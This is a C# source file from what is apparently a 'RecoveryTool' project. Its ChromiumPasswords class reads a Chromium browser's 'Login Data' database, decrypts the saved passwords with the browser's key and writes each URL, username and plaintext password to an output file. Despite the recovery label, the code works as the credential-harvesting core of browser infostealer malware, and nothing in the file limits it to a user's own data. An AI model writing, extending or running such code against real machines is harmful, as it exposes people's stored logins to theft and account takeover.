namespace RecoveryTool.Recovery.Browsers.Chromium
{
    public static class ChromiumPasswords
    {
        public static async Task RecoverAsync(string browserName, string relativeSearchPath)
        {
            byte[] key = ChromiumCommon.GetKey(browserName);
            if (key == null) return;

            string dbName = "Login Data";
            string query = ChromiumCommon.DbQueries["Passwords"];

            ChromiumCommon.ExecuteSqliteQueryAndProcessResultsAsync(
                browserName,
                dbName,
                query,
                async reader =>
                {
                    string url = reader["origin_url"].ToString();
                    string username = reader["username_value"].ToString();
                    byte[] passwordBlob = (byte[])reader["password_value"];
                    string decryptedPassword = ChromiumCommon.DecryptChromium(passwordBlob, key);
                    return $"URL: {url}\nUsername: {username}\nPassword: {decryptedPassword}\n";
                },
                ChromiumCommon.FileNames["Passwords"]);
        }
    }
}